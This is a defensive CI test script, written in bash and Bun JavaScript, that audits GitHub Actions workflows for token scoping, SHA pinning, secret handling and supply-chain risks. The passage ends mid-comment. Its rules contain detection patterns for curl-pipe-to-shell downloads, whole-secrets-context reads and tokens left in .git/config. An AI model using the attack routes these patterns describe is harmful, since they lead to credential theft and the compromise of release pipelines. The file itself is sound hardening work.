#!/usr/bin/env bash
# Workflow token and supply-chain hardening checks (#646). Needs bash and bun.
#
#   1. Every job's GITHUB_TOKEN scope is written down: each workflow either
#      declares a top-level `permissions:` or gives every job its own. A job
#      with neither inherits the REPOSITORY default, which is a setting outside
#      this tree -- read-only today (the run logs show Contents/Metadata/
#      Packages: read), but one toggle away from write on every PR run of code
#      the PR itself supplies.
#   2. The publish path holds nothing by default: release-exec.yml declares
#      `permissions: {}` at the top and every job asks for exactly what it
#      uses, so a new job starts with no token rather than inheriting write.
#   3. Every `uses:` in a workflow that holds AUTHORITY names a full 40-hex
#      commit SHA (or a local ./ path). A tag is mutable: whoever controls the
#      action's repo can move it, and the next run executes whatever it points
#      at with that workflow's token. "Authority" is derived, not listed: any
#      write scope or `id-token: write` (top level or any job), `write-all`,
#      or a `pull_request_target` trigger. A fixed list of "the publish path"
#      missed release.yml and sync-pieces-catalog.yml, whose tokens can create
#      a v* tag and dispatch a real release, and installer-release.yml, which
#      signs and publishes installers.
#   4. The catalog sync (#686) handles third-party data -- the activepieces
#      monorepo, npm registry answers, and the dependencies whose lifecycle
#      scripts `bun install` runs -- only in jobs with no write scope and no
#      id-token, and every `bun install` is --frozen-lockfile.
#   5. A workflow that holds authority does not fetch, in the ways checked
#      here, code by a name that can move (#681): no `*version` input or env
#      that is a channel or a range, no global npm install without an exact
#      version, no `@latest`-style run, no `curl | sh`, the QEMU binfmt and
#      BuildKit images pinned by digest, and no Bun, Go cache or binfmt image
#      restored from the Actions cache (writable by any run on main), and
#      (#680) no SBOM generator image by tag. Both
#      npm publishers pin the same exact npm, no workflow sets NPM_VERSION
#      anywhere but at its top level and there only to an exact x.y.z, and an
#      npm: alias is never an exact version (#960), and every Dockerfile base image
#      is pinned by tag and digest, its Bun bases at BUN_VERSION (#783). Not
#      checked: setup-node's node-version major (runner tool cache).
#   6. Per-job authority (#682): no matrix job holds id-token (every leg would
#      get it); no `secrets: inherit`, and a local reusable workflow is passed
#      exactly the secrets it declares, which are exactly the ones it reads; a
#      job that runs `npm publish` with id-token runs no Bun and no dependency
#      install or build; on the release path no checkout leaves its token in
#      the repository config; no registry login happens on a dry run; and
#      (#781) a privileged job takes an artifact only by a digest another
#      job reported as an output, checked in the step right after the download,
#      and (#820) by no other route: not gh run download, the artifacts REST
#      API, the runtime artifact service (ACTIONS_RESULTS_URL and
#      ACTIONS_RUNTIME_TOKEN) or any other action named for artifacts,
#      downloads or the runtime.
#   7. (#687) "Authority" also counts any use of the `secrets` context other
#      than secrets.GITHUB_TOKEN (including toJSON(secrets)), and `secrets:
#      inherit`; and every rule that reads steps descends into local
#      composite actions (./.github/actions/*), recursively, with the caller
#      inputs substituted. A local action that cannot be read, is not
#      composite, or nests too deep is reported rather than skipped. Rule 5
#      also refuses actions/cache restores where authority is held.
#   8. The catalog PR is opened with RELEASE_PR_TOKEN, never GITHUB_TOKEN, so
#      its CI runs and main's required `test` check can pass (#935); a step
#      before it refuses an empty secret; the PAT is read nowhere else; and
#      rule 4 counts a job that reads any non-GITHUB_TOKEN secret as holding
#      write, where no JavaScript runtime may run at all.
#
# Each rule is also run against a mutated copy that breaks it, and must report
# it, so a neutered check fails here instead of passing everything.
#
# Run from anywhere:  .github/scripts/workflow-hardening.test.sh
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORKFLOWS="${WORKFLOW_DIR:-${HERE}/../workflows}"

pass=0
fail=0
ok() {
	pass=$((pass + 1))
	echo "  ok   - $1"
}
no() {
	fail=$((fail + 1))
	echo "  FAIL - $1"
	[ -n "${2:-}" ] && printf '%s\n' "$2" | sed 's/^/         /'
}

command -v bun >/dev/null || {
	echo "bun is required (Bun.YAML)" >&2
	exit 1
}
WORK="$(mktemp -d)" || exit 1
trap 'rm -rf "$WORK"' EXIT

# check <rule> <file>: one violation per line, nothing when clean.
#   rule = scoped | publish-perms | pinned | authority | untrusted | mutable
#          | narrow | pushcache | catalog-pr | npmpin
check() {
	# shellcheck disable=SC2016 # JavaScript source, not shell: nothing should expand.
	RULE="$1" FILE="$2" REPO="${REPO_DIR:-${HERE}/../..}" bun -e '
const doc = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
const jobs = doc.jobs ?? {};
const out = [];
const rule = process.env.RULE;
// The steps of a job, with every local composite action expanded in place (#687),
// recursively: a workflow that pins everything it names can otherwise reach
// unpinned code one level down. In a composite step, ${{ inputs.X }} is
// replaced by what the caller passes, or by the input default.
const flatSteps = (steps, via = "", depth = 0) => {
  const outSteps = [];
  for (const st of steps ?? []) {
    outSteps.push({ st, via });
    const u = String(st.uses ?? "");
    if (!u.startsWith("./") || /\.ya?ml$/.test(u)) continue;
    // Every rule that reads steps would otherwise pass what it cannot see.
    if (depth > 4) { out.push(via + u + ": local actions nested too deep to check"); continue; }
    let action = null;
    for (const f of ["action.yml", "action.yaml"])
      try { action = Bun.YAML.parse(require("node:fs").readFileSync(process.env.REPO + "/" + u.slice(2).replace(/\/$/, "") + "/" + f, "utf8")); break; } catch {}
    if (!action) { out.push(via + u + ": local action cannot be read, so it cannot be checked"); continue; }
    if (action.runs?.using !== "composite") { out.push(via + u + ": local " + action.runs?.using + " action, which this test cannot look inside"); continue; }
    // Input names are case-insensitive to GitHub.
    const inputs = new Map();
    for (const [k, v] of Object.entries(action.inputs ?? {})) inputs.set(k.toLowerCase(), v?.default ?? "");
    for (const [k, v] of Object.entries(st.with ?? {})) inputs.set(k.toLowerCase(), v);
    const fill = (x) => JSON.parse(JSON.stringify(x).replace(/\$\{\{\s*inputs\.([A-Za-z0-9_-]+)\s*\}\}/g,
      (m, k) => inputs.has(k.toLowerCase()) ? JSON.stringify(String(inputs.get(k.toLowerCase()))).slice(1, -1) : m));
    outSteps.push(...flatSteps(action.runs.steps.map(fill), via + u + " > ", depth + 1));
  }
  return outSteps;
};
if (rule === "scoped" && doc.permissions === undefined)
  for (const [name, job] of Object.entries(jobs))
    if (job.permissions === undefined)
      out.push(name + ": no permissions of its own and none at the top level, so it inherits the repository default");
if (rule === "publish-perms") {
  const top = doc.permissions;
  if (!(top && typeof top === "object" && Object.keys(top).length === 0))
    out.push("top-level permissions must be {} (got " + JSON.stringify(top) + ")");
  for (const [name, job] of Object.entries(jobs))
    if (job.permissions === undefined) out.push(name + ": declares no permissions of its own");
}
if (rule === "authority") {
  // Prints "yes" when the workflow holds authority (see header), else nothing.
  const grants = (perm) => perm === "write-all" ||
    (perm && typeof perm === "object" && Object.values(perm).some((v) => v === "write"));
  const on = doc.on ?? doc[true] ?? {};
  const triggers = typeof on === "string" ? [on] : Array.isArray(on) ? on : Object.keys(on);
  // A secret is authority whatever the token scopes (#687): the code that
  // can read it is the code this rule exists to pin. GITHUB_TOKEN is the
  // token itself, whose scope the permissions blocks already describe.
  // Read inside expressions only, so a `secrets:` mapping key does not count
  // by itself (its values are expressions and do), and the whole context --
  // toJSON(secrets), secrets[...] -- counts.
  // Context names are case-insensitive to GitHub, and an expression can
  // hold braces (format strings), so read up to the closing }} lazily.
  const exprs = [...JSON.stringify({ env: doc.env, jobs }).matchAll(/\$\{\{([\s\S]*?)\}\}/g)].map((m) => m[1]);
  const secret = exprs.some((e) => /\bsecrets\b(?!\s*\.\s*GITHUB_TOKEN\b)/i.test(e));
  if (grants(doc.permissions) || Object.values(jobs).some((j) => grants(j.permissions)) ||
      triggers.includes("pull_request_target") || secret || Object.values(jobs).some((j) => j.secrets === "inherit"))
    out.push("yes");
}
if (rule === "catalog-pr") {
  // The catalog PR is opened with RELEASE_PR_TOKEN, never GITHUB_TOKEN: GitHub
  // holds the CI of a PR that GITHUB_TOKEN opens or pushes for approval, so
  // main never sees its required `test` check and the PR cannot merge (#935).
  // No fallback to GITHUB_TOKEN either, which would reopen that silently. And
  // the job refuses first, through env and a run step (the secrets context is
  // not dependable in an `if:`), under the same condition as the PR step, so
  // a missing secret fails with a reason instead of opening a dead PR.
  const pat = /^\$\{\{\s*secrets\.RELEASE_PR_TOKEN\s*\}\}$/;
  let prSteps = 0;
  for (const [name, job] of Object.entries(jobs)) {
    const steps = flatSteps(job.steps).map((x) => x.st);
    steps.forEach((s, i) => {
      if (!String(s.uses ?? "").toLowerCase().startsWith("peter-evans/create-pull-request@")) return;
      prSteps++;
      const label = name + ": step " + (s.name ?? s.id ?? String(i));
      for (const k of ["token", "branch-token"])
        if ((k === "token" || s.with?.[k] !== undefined) && !pat.test(String(s.with?.[k] ?? "")))
          out.push(label + ": " + k + " is " + JSON.stringify(s.with?.[k] ?? "the default github.token") + ", not secrets.RELEASE_PR_TOKEN alone");
      // The exit 1 has to sit inside the [ -z ] branch, and neither the step
      // nor the job may carry continue-on-error, which turns the refusal
      // into a warning and lets the dead PR open anyway.
      const refuses = !job["continue-on-error"] && steps.slice(0, i).some((r) => {
        const vars = Object.entries(r.env ?? {}).filter(([, v]) => pat.test(String(v))).map(([k]) => k);
        // Comments dropped first, so an `exit 1` in one does not count.
        const run = (typeof r.run === "string" ? r.run : "").split("\n").map((l) => l.replace(/(^|\s)#.*$/, "")).join("\n");
        return vars.some((v) => new RegExp("\\[ -z \"\\$\\{?" + v + "\\}?\" \\][^\\n]*\\bthen\\b(?:(?!\\bfi\\b)[^])*?\\bexit 1\\b[^]*?\\bfi\\b").test(run)) &&
          !r["continue-on-error"] && (r.if === undefined || r.if === s.if);
      });
      if (!refuses)
        out.push(label + ": no earlier step refuses when RELEASE_PR_TOKEN is empty (env, a [ -z ] test and exit 1, under the same condition)");
    });
  }
  if (prSteps === 0) out.push("no peter-evans/create-pull-request step, so nothing here opens the catalog PR");
  // The PAT appears exactly twice: the PR step token and the refusal env.
  // Anywhere else it reaches code this rule has not looked at.
  const patUses = [...JSON.stringify({ env: doc.env, jobs }).matchAll(/\$\{\{([\s\S]*?)\}\}/g)]
    .filter((m) => /\bsecrets\s*(?:\.\s*RELEASE_PR_TOKEN\b|\[\s*[\x27"]RELEASE_PR_TOKEN[\x27"]\s*\])/i.test(m[1])).length;
  if ([...JSON.stringify({ env: doc.env, jobs }).matchAll(/\$\{\{([\s\S]*?)\}\}/g)].some((m) => /\bsecrets\b\s*(?![\s.\[])/i.test(m[1])))
    out.push("the whole secrets context is read somewhere (toJSON(secrets) or similar), which includes RELEASE_PR_TOKEN");
  if (patUses !== 2) out.push("secrets.RELEASE_PR_TOKEN is read " + patUses + " times; expected 2 (the PR step token and the refusal env)");
}
if (rule === "untrusted") {
  // A job that installs dependencies (whose lifecycle scripts run arbitrary
  // code from the registry) or processes third-party data holds no write scope
  // and no id-token, and installs only what the lockfile records (#686).
  const writes = (perm) => perm === "write-all" ||
    (perm && typeof perm === "object" && Object.values(perm).some((v) => v === "write"));
  // Installs, updates and package runners, with any flags before the verb
  // (`bun --cwd x install`). A global `npm install -g <pkg>` is not an
  // install of the repository dependencies and is not matched.
  const flags = "(?:\\s+--?[\\w-]+(?:=\\S+)?(?:\\s+(?!-)(?!(?:install|i|add|update|x|ci|exec|dlx)\\b)\\S+)?)*";
  const install = new RegExp("\\b(?:bun" + flags + "\\s+(?:install|i|add|update|x)|npm" + flags +
    "\\s+(?:ci|install|i|add|update|exec|x)(?!\\s+(?:-g|--global)\\b)|pnpm" + flags +
    "\\s+(?:install|i|add|update|dlx|exec)|yarn|bunx|npx)\\b");
  const bunInstall = new RegExp("\\bbun" + flags + "\\s+(?:install|i)\\b");
  const frozen = /--frozen-lockfile(?![=\w-])/;
  const thirdParty = /\bscripts\/(sync-pieces-catalog|inspect-verified-pieces)\.ts\b/;
  // One logical line per command: continuations joined, comments dropped, and
  // quoted text blanked so an `echo "bun install failed"` is not an install.
  let pkgScripts = {};
  try { pkgScripts = JSON.parse(require("node:fs").readFileSync(process.env.REPO + "/package.json", "utf8")).scripts ?? {}; } catch {}
  const lines = (run) => run.replace(/\\\n/g, " ").split("\n").map((l) => l.trim())
    .filter((l) => l && !l.startsWith("#"))
    .map((l) => {
      // Text handed to a shell (`bash -c "bun install"`) is a command, so it
      // stays; and `bun run <name>` is expanded through package.json scripts,
      // so an alias of the generator is the generator.
      const bare = /\b(?:ba|z)?sh\s+-c\b/.test(l) ? l
        : l.replace(/"(?:[^"\\]|\\.)*"/g, "\"\"").replace(/\x27[^\x27]*\x27/g, "\"\"");
      // Every script name on the line, after any flags, expanded until no
      // new name appears (an alias of an alias), with a cycle guard.
      // Flags may take a value (`--cwd .`, `--prefix x`) on either side of
      // `run`, and the name may be quoted, so names are read from the line
      // with quotes removed rather than blanked.
      const fl = "(?:\\s+--?[\\w-]+(?:[= ](?!-)(?!run\\b)[^\\s;&|]+)?)*";
      const nameRe = new RegExp("\\b(?:bun|npm|pnpm|yarn)" + fl + "(?:\\s+(?:run|run-script))?" + fl + "\\s+(?!-)([\\w:.-]+)", "g");
      const names = (text) => [...text.replace(/["\x27]/g, "").matchAll(nameRe)].map((m) => m[1]);
      const seen = new Set();
      let expanded = bare;
      for (let todo = names(l); todo.length; ) {
        const n = todo.shift();
        if (seen.has(n) || !Object.hasOwn(pkgScripts, n)) continue;
        seen.add(n);
        expanded += " ; " + pkgScripts[n];
        todo.push(...names(pkgScripts[n]));
        // npm and bun run pre<name> and post<name> around it.
        for (const hook of ["pre" + n, "post" + n]) if (Object.hasOwn(pkgScripts, hook)) todo.push(hook);
      }
      return [l, expanded];
    });
  // A job holds write when its GITHUB_TOKEN does, and also when it reads any
  // other secret: the catalog PR is pushed with a PAT, so a publish job whose
  // GITHUB_TOKEN is read-only still holds a credential that can write.
  const secretRef = (x) => [...JSON.stringify(x ?? null).matchAll(/\$\{\{([\s\S]*?)\}\}/g)]
    .some((m) => /\bsecrets\b(?!\s*\.\s*GITHUB_TOKEN\b)/i.test(m[1]));
  for (const [name, job] of Object.entries(jobs)) {
    const perm = job.permissions ?? doc.permissions;
    // Workflow-level env reaches every job, so a secret there is held by all.
    const held = writes(perm) || secretRef({ env: doc.env, job });
    // Local composite actions are part of the job (#687): flatSteps expands
    // them, recursively, with inputs substituted.
    for (const [i, { st: s, via: path }] of flatSteps(job.steps).entries()) {
      const label = name + ": step " + (s.name ?? s.id ?? s.uses ?? String(i));
      const run = typeof s.run === "string" ? s.run : "";
      const via = path ? " (inside " + path.slice(0, -3) + ")" : "";
      for (const [t, bare] of lines(run)) {
        const holding = writes(perm) ? JSON.stringify(perm) : "a secret other than GITHUB_TOKEN";
        if (held && install.test(bare)) out.push(label + via + ": installs dependencies in a job holding " + holding + ": " + t);
        if (held && thirdParty.test(bare)) out.push(label + via + ": processes third-party data in a job holding " + holding + ": " + t);
        // The write job takes generated TypeScript from a read-only job, and
        // the first thing to run it must be the PR CI, not this job: no
        // JavaScript runtime at all here, whatever script it is pointed at.
        if (held && (/(?:^|[\s;&|(/])(?:bun|bunx|node|npx|deno)(?=$|\s)/.test(bare) ||
            // A script file in command position runs through its shebang.
            /(?:^|[;&|(]\s*|\b(?:then|do|else|exec)\s+)[^\s;&|()]+\.(?:[cm]?[jt]s|tsx|jsx)(?=$|[\s;&|)])/.test(bare)))
          out.push(label + via + ": runs JavaScript in a job holding " + holding + ": " + t);
        if (bunInstall.test(bare) && !frozen.test(bare)) out.push(label + via + ": bun install without --frozen-lockfile: " + t);
      }
    }
    // A JavaScript runtime reached without a run line naming it: as the
    // step shell, or through an action that exists to run inline scripts.
    if (held)
      for (const [i, { st: s }] of flatSteps(job.steps).entries()) {
        const label = name + ": step " + (s.name ?? s.id ?? s.uses ?? String(i));
        if (/\b(?:bun|bunx|node|deno)\b/.test(String(s.shell ?? job.defaults?.run?.shell ?? doc.defaults?.run?.shell ?? "")))
          out.push(label + ": runs JavaScript (as its shell) in a job holding a write scope or a secret");
        if (String(s.uses ?? "").toLowerCase().startsWith("actions/github-script@"))
          out.push(label + ": runs JavaScript (github-script) in a job holding a write scope or a secret");
      }
    // #821: a job holding a write scope takes what a read-only job produced,
    // so its checkout leaves no token on disk for anything it then runs to
    // find. Nothing there needs one: create-pull-request hides any persisted
    // credential and configures its own from its token input, and gh reads
    // GH_TOKEN from the step env.
    if (held)
      for (const { st: s } of flatSteps(job.steps))
        if (String(s.uses ?? "").toLowerCase().startsWith("actions/checkout@") && s.with?.["persist-credentials"] !== false)
          out.push(name + ": checkout leaves the write token in .git/config (persist-credentials is not false)");
  }
}
if (rule === "mutable") {
  // Code a pinned action, or a run: step, fetches by a name that can move
  // (#681). A SHA-pinned action is only half the pin if it then downloads
  // `latest` of something and runs it with the token of this workflow.
  const envRef = /\$\{\{\s*env\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}/g;
  const resolve = (v, ...scopes) => String(v ?? "").replace(envRef, (m, k) => {
    for (const e of scopes) if (e && typeof e === "object" && k in e) return String(e[k]);
    return m;
  });
  // A version is floating when it is a channel name or a range. A bare
  // major ("22") is accepted for node-version only: setup-node takes it from
  // the runner image tool cache, so it moves with the image, not the network.
  const channel = /^\s*(latest|stable|canary|nightly|next|lts\/\*|\*|x)\s*$/i;
  const range = /[\^~<>*|]|(^|\.)x(\.|$)|\s-\s/i;
  const floating = (v, key = "") => {
    const t = String(v).trim();
    if (channel.test(t) || range.test(t)) return true;
    if (/^\d+$/.test(t) || /^\d+\.\d+$/.test(t)) return !(key === "node-version" && /^\d+$/.test(t));
    return false;
  };
  const exactVersion = /^v?\d+\.\d+\.\d+(-[0-9A-Za-z.-]+)?$/;
  const digest = /@sha256:[0-9a-f]{64}$/;
  // Shell $VAR / ${VAR} too, for a run: that reads an env value.
  const shellRef = /\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?/g;
  const resolveShell = (t, scopes) => t.replace(shellRef, (m, k) => {
    for (const e of scopes) if (e && typeof e === "object" && k in e) return String(e[k]);
    return m;
  });
  for (const [k, v] of Object.entries(doc.env ?? {}))
    if (/version$/i.test(k) && floating(v)) out.push("env." + k + " is " + JSON.stringify(v));
  for (const [name, job] of Object.entries(jobs)) {
    for (const [k, v] of Object.entries(job.env ?? {}))
      if (/version$/i.test(k) && floating(resolve(v, doc.env)))
        out.push(name + ": env." + k + " is " + JSON.stringify(v));
    for (const [i, { st: s, via }] of flatSteps(job.steps).entries()) {
      const label = name + ": step " + (via ? "(via " + via.slice(0, -3) + ") " : "") + (s.name ?? s.id ?? s.uses ?? String(i));
      const scopes = [s.env, job.env, doc.env];
      for (const [k, v] of Object.entries(s.env ?? {}))
        if (/version$/i.test(k) && floating(resolve(v, job.env, doc.env)))
          out.push(label + ": env." + k + " is " + JSON.stringify(v));
      // A version read from a repository file is whatever that file says --
      // for Bun, the engines range in package.json. go-version-file is allowed:
      // go.mod names one exact toolchain.
      for (const k of ["bun-version-file", "node-version-file"])
        if (s.with?.[k] !== undefined) out.push(label + ": " + k + " reads a version that may be a range");
      if (typeof s.with?.["go-version-file"] === "string") {
        // ...which holds only while the directive is three-part: `go 1.26`
        // lets setup-go pick the newest 1.26.x.
        let mod = "";
        try { mod = require("node:fs").readFileSync(process.env.REPO + "/" + s.with["go-version-file"], "utf8"); } catch {}
        const go = /^go\s+(\S+)\s*$/m.exec(mod)?.[1];
        const tc = /^toolchain\s+go(\S+)\s*$/m.exec(mod)?.[1];
        if (!go || !/^\d+\.\d+\.\d+$/.test(tc ?? go))
          out.push(label + ": " + s.with["go-version-file"] + " does not name an exact Go version (go " + go + (tc ? ", toolchain go" + tc : "") + ")");
      }
      for (const [k, v] of Object.entries(s.with ?? {}))
        if (/version$/i.test(k) && floating(resolve(v, ...scopes), k))
          out.push(label + ": " + k + " resolves to " + JSON.stringify(resolve(v, ...scopes)));
      if (typeof s.run === "string")
        for (const raw of s.run.replace(/\\\n/g, " ").split("\n")) {
          const line = resolveShell(resolve(raw, ...scopes), scopes).replace(/["\x27]/g, "").trim();
          if (line.startsWith("#")) continue;
          // A global install runs that package at whatever version the spec
          // names: every package in it needs an exact @x.y.z.
          // Options may come before the verb (npm -g install x), and the
          // global flag anywhere on the line (#960 review).
          const g = /\b(?:npm|pnpm)(?:\s+-\S+)*\s+(?:install|i|add)\b(.*)$/.exec(line);
          if (g && /(?:^|\s)(?:-g|--global|--location[= ]global)\b/.test(line))
            for (const tok of g[1].split(/\s+/).filter((x) => x && !x.startsWith("-"))) {
              // The first @ after the name, not the last (#960): in
              // npm@npm:other@1.2.3 the version is an alias that installs
              // another package, and its last @ is followed by 1.2.3.
              const at = tok.indexOf("@", 1);
              if (at <= 0 || !/^(?:@[\w.~-]+\/)?[\w.~-]+$/.test(tok.slice(0, at)) || !exactVersion.test(tok.slice(at + 1)))
                out.push(label + ": global install of " + tok + " is not an exact version: " + raw.trim());
            }
          if (/\b(?:bun|bunx|npx|pnpm|yarn)\b.*@(?:latest|next|canary|nightly)\b/.test(line))
            out.push(label + ": runs a floating version: " + raw.trim());
          if (/\b(?:curl|wget)\b[^|]*\|\s*(?:sudo\s+)?(?:ba|z)?sh\b/.test(line))
            out.push(label + ": pipes a download into a shell: " + raw.trim());
        }
      const uses = String(s.uses ?? "");
      // A pinned version is only what is requested: these actions restore
      // the bytes from the Actions cache, which any run on main can write.
      if (uses.startsWith("oven-sh/setup-bun@") && String(s.with?.["no-cache"]) !== "true")
        out.push(label + ": setup-bun without no-cache: true restores Bun from the Actions cache");
      if (/^actions\/cache(\/restore)?@/.test(uses))
        out.push(label + ": restores from the Actions cache (writable by any run on main)");
      if (uses.startsWith("actions/setup-go@") && String(s.with?.cache) !== "false")
        out.push(label + ": setup-go without cache: false restores modules and build output from the Actions cache");
      if (uses.startsWith("docker/setup-qemu-action@")) {
        // The binfmt image runs --privileged. Its default is :latest, and
        // cache-image (default true) loads it from the Actions cache before
        // every pull, and keeps that copy when the pull fails.
        const image = resolve(s.with?.image, ...scopes);
        if (!digest.test(image)) out.push(label + ": binfmt image is not pinned by digest (" + JSON.stringify(image || "default :latest") + ")");
        if (String(s.with?.["cache-image"]) !== "false") out.push(label + ": cache-image is not false");
      }
      if (uses.startsWith("docker/setup-buildx-action@") &&
          (s.with?.driver === undefined || s.with.driver === "docker-container")) {
        // The docker-container driver runs BuildKit from an image, by
        // default moby/buildkit:buildx-stable-1.
        const opts = resolve(s.with?.["driver-opts"], ...scopes).split(/\n|,/).map((x) => x.trim());
        const image = (opts.find((o) => o.startsWith("image=")) ?? "").slice("image=".length);
        if (!digest.test(image)) out.push(label + ": BuildKit image is not pinned by digest (" + JSON.stringify(image || "default buildx-stable-1") + ")");
      }
      // #680: an SBOM attestation runs a generator IMAGE inside the build,
      // with the image filesystem mounted, and its default is the tag
      // docker/buildkit-syft-scanner:stable-1. Both spellings: the sbom
      // input (true, or generator=...) and an attests entry of type=sbom.
      if (/^docker\/(build-push-action|bake-action)@/i.test(uses)) {
        const specs = [];
        const sbom = resolve(s.with?.sbom, ...scopes).trim();
        if (sbom && sbom.toLowerCase() !== "false") specs.push(sbom);
        for (const a of resolve(s.with?.attests, ...scopes).split("\n"))
          if (/(?:^|,)\s*type\s*=\s*sbom\b/i.test(a)) specs.push(a);
        for (const spec of specs) {
          const g = /(?:^|,)\s*generator\s*=\s*([^,\s]+)/i.exec(spec)?.[1] ?? "";
          if (!digest.test(g)) out.push(label + ": SBOM generator image is not pinned by digest (" + JSON.stringify(g || "default stable-1") + ")");
        }
      }
    }
  }
}
if (rule === "narrow") {
  // Per-job authority on the release path (#682).
  const fs = require("node:fs");
  const writes = (perm, k) => perm === "write-all" || (perm && typeof perm === "object" && perm[k] === "write");
  const refs = (o) => new Set([...JSON.stringify(o).matchAll(/\bsecrets\s*\.\s*([A-Za-z_][A-Za-z0-9_]*)/gi)].map((m) => m[1]).filter((k) => k.toUpperCase() !== "GITHUB_TOKEN"));
  // The release path: any workflow with a job in the `release` environment
  // (release-exec.yml and sidecar-release.yml). None of their jobs runs git
  // with credentials, so none needs the token left in the repository config.
  //
  // The name may be an expression, because a dry run names a different
  // environment so a rehearsal is not recorded as a deployment of `release`.
  // A literal `release` counts, and so does an expression that can evaluate to
  // it -- matched as the quoted word inside `${{ }}`, not as a bare substring,
  // so an environment merely CALLED `release-dry-run` does not qualify on its
  // own. Getting this wrong fails open: every rule below is gated on it, and
  // five assertions here exist to catch that.
  const gatedByRelease = (j) => {
    const n = j.environment?.name ?? j.environment;
    if (typeof n !== "string") return false;
    if (n === "release") return true;
    return n.includes("${{") && /(^|[^-\w])'release'([^-\w]|$)/.test(n);
  };
  // ...and (#779) any workflow in which a job can mint an OIDC token. The
  // environment test alone used to miss installer-release.yml: it had no
  // `release` environment, yet it compiled the job that federates into the
  // same KMS signing key as the sidecar. #920 has since gated its `publish`
  // job on `release`, so it now qualifies either way. The token test stays,
  // because a token is the authority whatever the environment is called, and
  // a workflow added later can mint one with no environment at all.
  const mintsToken = Object.values(jobs).some((j) => writes(j.permissions ?? doc.permissions, "id-token"));
  const release = Object.values(jobs).some(gatedByRelease) || mintsToken;
  for (const [name, job] of Object.entries(jobs)) {
    const perm = job.permissions ?? doc.permissions;
    const oidc = writes(perm, "id-token");
    // GitHub has no per-leg permissions: a matrix job holding id-token hands
    // it to every leg, whichever one needs it.
    if (oidc && job.strategy?.matrix && typeof job.uses !== "string")
      out.push(name + ": a matrix job holding id-token: write (every leg can mint a token)");
    if (job.secrets === "inherit")
      out.push(name + ": secrets: inherit (pass the named secrets the called workflow declares)");
    if (typeof job.uses === "string" && job.uses.startsWith("./") && job.secrets !== "inherit") {
      let called = null;
      try { called = Bun.YAML.parse(fs.readFileSync(process.env.REPO + "/" + job.uses.slice(2), "utf8")); } catch {}
      if (!called) out.push(name + ": cannot read " + job.uses);
      else {
        const on = called.on ?? called[true] ?? {};
        const declared = Object.keys(on.workflow_call?.secrets ?? {}).sort();
        const used = [...refs(called.jobs ?? {})].sort();
        if ([...JSON.stringify(called.jobs ?? {}).matchAll(/\$\{\{([\s\S]*?)\}\}/g)].some((m) => /\bsecrets\b(?!\s*\.)/i.test(m[1])))
          out.push(name + ": " + job.uses + " reads the whole secrets context, so no list of secrets passed to it can be checked");
        // No `secrets:` at all passes nothing, which is the case that makes
        // the macOS signing steps silently skip.
        const given = job.secrets && typeof job.secrets === "object" ? job.secrets : {};
        const passed = Object.keys(given).sort();
        if (JSON.stringify(declared) !== JSON.stringify(used))
          out.push(name + ": " + job.uses + " reads secrets " + JSON.stringify(used) + " but declares " + JSON.stringify(declared));
        if (JSON.stringify(passed) !== JSON.stringify(declared))
          out.push(name + ": passes " + JSON.stringify(passed) + " to " + job.uses + ", which declares " + JSON.stringify(declared));
        for (const [k, v] of Object.entries(given))
          if (String(v).replace(/\s+/g, "") !== "${{secrets." + k + "}}")
            out.push(name + ": passes " + k + " as " + JSON.stringify(v) + ", not secrets." + k);
      }
    }
    // Composite actions expanded (#687): a local action is part of the job.
    const steps = flatSteps(job.steps).map((x) => x.st);
    const runs = steps.map((st) => typeof st.run === "string" ? st.run : "").join("\n");
    // A job that can mint an npm publish token publishes, and runs no
    // dependency or repository build code: that happens in a job without it.
    // Commands only: a word at the start of a line, after ; & | ( ! or $( or
    // a backtick, after then/do/else, or behind sudo/env/exec/time/command.
    // Also behind if/elif/while/until, VAR=value assignments, timeout N,
    // xargs and nohup, and with a directory in front of the program.
    // Also inside a { ...; } group, and behind sudo or env options that take
    // a value (sudo -u root, env -u VAR) (#817 review).
    const cmd = (w) => new RegExp("(?:^|[;&|(!`{]\\s*|\\$\\(\\s*|\\b(?:then|do|else|if|elif|while|until)\\s+)" +
      "(?:(?:sudo|env|exec|time|command|nice|nohup|xargs)\\s+(?:-[ugCDhprtU]\\s+\\S+\\s+|-\\S+\\s+)*|timeout\\s+(?:-\\S+\\s+)*\\S+\\s+|[A-Za-z_][A-Za-z0-9_]*=\\S*\\s+)*(?:\\S*/)?" + w);
    // Comments: a # at line start or after whitespace, outside ${#...} and
    // outside quotes, so `echo "step #1"; cmd` keeps its cmd (#817 review).
    const stripComment = (l) => {
      let q = "";
      for (let i = 0; i < l.length; i++) {
        const c = l[i];
        if (q) { if (c === q) q = ""; else if (c === "\\" && q === "\"") i++; continue; }
        if (c === "\"" || c === "\x27") { q = c; continue; }
        if (c === "\\") { i++; continue; }
        if (c === "#" && (i === 0 || /\s/.test(l[i - 1])) && l[i + 1] !== "{") return l.slice(0, i);
      }
      return l;
    };
    const lines = runs.split("\n").map((l) => stripComment(l).trim());
    // npm verbs that run package or repository code, and any global install
    // that is not npm itself pinned to NPM_VERSION.
    // Options may come before the verb (#960 review: npm -g install x).
    const npmRuns = cmd("npm(?:\\s+-\\S+)*\\s+(?:ci|install|i|add|isntall|in|it|install-test|install-ci-test|run|run-script|rum|urn|exec|x|pack|rebuild|rb|test|t|tst|start|restart|stop|update|up|upgrade|dedupe|link|ln|explore)\\b");
    // The pinned install is that exact line and nothing else on it: no
    // VAR=value in front (npm_config_registry=...), no other spelling.
    const isGlobal = (line) => /\s(?:-g|--global|--location[= ]global)\b/.test(line);
    const globalOther = (line) => /\bnpm(?:\s+-\S+)*\s+(?:install|i|add)\b/.test(line) && isGlobal(line) &&
      line.trim() !== "npm install -g \"npm@${NPM_VERSION}\"";
    if (oidc && /\bnpm\b[^\n;&|]*\spublish\b/.test(runs)) {
      if (steps.some((st) => String(st.uses ?? "").startsWith("oven-sh/setup-bun@")))
        out.push(name + ": publishes with id-token and installs Bun");
      // The shell a step runs in, its own or a default, is one of the plain
      // ones: anything else (env X=y bash, bash -c ...) runs code first.
      const plainShell = ["bash", "sh", "bash -e {0}", "sh -e {0}", "bash --noprofile --norc -eo pipefail {0}"];
      for (const st of steps) {
        const sh = st.shell ?? job.defaults?.run?.shell ?? doc.defaults?.run?.shell;
        if (sh !== undefined && !plainShell.includes(String(sh).trim()))
          out.push(name + ": step with shell: " + sh + " in a job that publishes with id-token");
      }
      // npm reads npm_config_* from the environment, the registry included,
